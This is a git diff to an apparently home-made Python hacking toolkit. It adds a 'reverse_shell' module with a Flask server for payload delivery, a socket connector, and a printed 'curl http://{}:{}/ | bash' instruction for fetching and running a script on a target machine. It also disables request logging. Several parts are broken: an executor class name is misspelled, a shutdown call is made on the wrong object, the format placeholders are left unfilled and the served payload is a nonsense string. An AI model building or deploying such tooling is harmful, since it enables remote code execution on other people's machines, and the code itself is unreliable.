@@ -1,7 +1,12 @@
 import modules.plugin as plugin
 from os import system
 import threading
-import sys
+import logging
+from time import sleep
+from concurrent.futures import ThreadPoolExecuter
+
+log = logging.getLogger('werkzeug')
+log.disabled = True
 
 class colors:
     """
@@ -35,16 +40,31 @@ class essensials:
             else: return False
         return a
 
+    def closeThread(thread):
+        try:
+            thread.exit()
+            return True
+        except:
+            return False
+
 class EndpointAction(object):
     """
     https://stackoverflow.com/questions/40460846/using-flask-inside-class
+
+    line 64
     """
 
-    def __init__(self, action):
+    def __init__(self, action, send="no"):
+        try:
+            from flask import Flask, Response
+        except ImportError:
+            print("[!] flask needed for script download; skipping...")
+            return
+            
         self.action = action
-        self.response = Response(status=200, headers={})
+        self.response = send
 
-    def __call__(self, *args):
+    def __call__(self, send="ok"):
         self.action()
         return self.response
 
@@ -52,17 +72,25 @@ class EndpointAction(object):
 class FlaskAppWrapper(object):
     """
     https://stackoverflow.com/questions/40460846/using-flask-inside-class
+
+    i edited it and only god knows how it works
     """
     app = None
 
     def __init__(self, name):
+        try:
+            from flask import Flask, Response
+        except ImportError:
+            print("[!] flask needed for script download; skipping...")
+            return
+            
         self.app = Flask(name)
 
-    def run(self):
-        self.app.run()
+    def run(self, port, ip):
+        self.app.run(ip, port=port)
 
-    def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None):
-        self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler))
+    def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None, send="ok"):
+        self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler, send=handler()))
 
 class modules:
     """
@@ -70,30 +98,52 @@ class modules:
     """
     class reverse_shell:
         def flaskThread(a, ip, port:int):
-            a.run(ip, port=port)
+            with ThreadPoolExecuter(max_workers=1) as pool:
+                site = pool.submit(a.run, port, ip)
+
+                while True:
+                    if sysVar.rsSite:
+                        pass
+                    else:
+                        site.shutdown()
+                        pool.shutdown()
 
         def download():
             """
             flask download handler
             """
-            return "no"
+            return "bniobnjghoj"
 
         def initDownload(args:list):
             """
             execute the download server for quick execution/injection
             """
+
+            if sysVar.rsSite == True:
+                if input("[!] flask server already running; close it? [Y/n]").lower() == "y":
+                    sysVar.rsSite = False
+                    print("[-] closed site")
+                    return
+                else:
+                    return
+
+            sysVar.rsSite = True
+
             try:
-                from flask import Flask
-            except ImportError:
-                print("[!] flask needed for script download; skipping...")
+                ip = args[1]
+                port = args[2]
+            except:
+                print("not enough args")
                 return
-
+                
             a = FlaskAppWrapper('wrap')
-            a.add_endpoint(endpoint='/', endpoint_name='main', handler=modules.reverse_shell.download)
+            a.add_endpoint(endpoint='/', endpoint_name='m', handler=modules.reverse_shell.download)
 
+            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/ | bash\" to run script") 
+            
             threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start()
 
-            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/ | bash\" to run script")
+            sleep(1)
 
         def initSocket(args:list):
             """
@@ -116,9 +166,6 @@ class modules:
 
                 with conn:
                     conn.sendall("test".encode('ascii'))
-                    
-            
-
 
             
     class dns:
@@ -175,6 +222,7 @@ class modules:
                 import httpx
             except ImportError: # httpx not available
                 print("[!] HTTPX needed for this module; pip install httpx")
+                return
 
             if args[3] != "0": # if proxy given
                 proxy = {"http": args[3].split(":")} # set our proxy to that
@@ -208,10 +256,22 @@ class sysVar:
         "cloneSite": {
             "module": modules.clone.cloneSite,
             "help": "download a site's HTML"
-        }
+        },
+
+        "rs-download": {
+            "module": modules.reverse_shell.initDownload,
+            "help": "start http flask server to download file from"
+        },
+
+        "rs-socket": {
+            "module": modules.reverse_shell.initSocket,
+            "help": "probe to client ip and attempt to connect"
+        },
     }
 
     runnable_plugins = []
+    rsSite = False
+    activeThreads = []
 
 if __name__ == "__main__":
     plugins = plugin.load(folder="modules") # load
